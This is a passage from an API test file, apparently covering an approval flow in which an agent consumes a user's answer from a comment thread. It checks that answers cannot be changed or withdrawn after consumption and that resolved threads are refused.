    expect((await withdraw(k, (await mkAgent(alice)).token)).status).toBe(403);
    expect((await withdraw(k, alice.cookie)).status).toBe(403);
    await pick(k);
    await consume(k, agent.token);
    const r = await withdraw(k, agent.token);
    expect(r.status).toBe(409);
    expect((await errOf(r)).code).toBe("consumed");
  });

  it("an answer cannot change after consume (409 consumed)", async () => {
    const k = await post();
    await pick(k);
    expect((await consume(k, agent.token)).status).toBe(200);
    const c = await challenge(k, alice.cookie, "deny");
    expect(c.status).toBe(409);
    expect((await errOf(c)).code).toBe("consumed");
    const r = await answer(k, alice.cookie, { optionId: "deny" });
    expect(r.status).toBe(409);
    expect((await errOf(r)).code).toBe("consumed");
    expect((await read(k, alice.cookie)).ask?.answer?.optionId).toBe("run");
  });

  it("a resolved thread can not be used", async () => {
    const k = await post();
    await pick(k);
    await api(
      app,
      `/api/v1/artifacts/${k.artifactId}/comments/${k.threadId}`,
      alice.cookie,
      { method: "PATCH", body: { status: "resolved" } },
    );
    await refusedWith(await consume(k, agent.token), "withdrawn");
  });
});
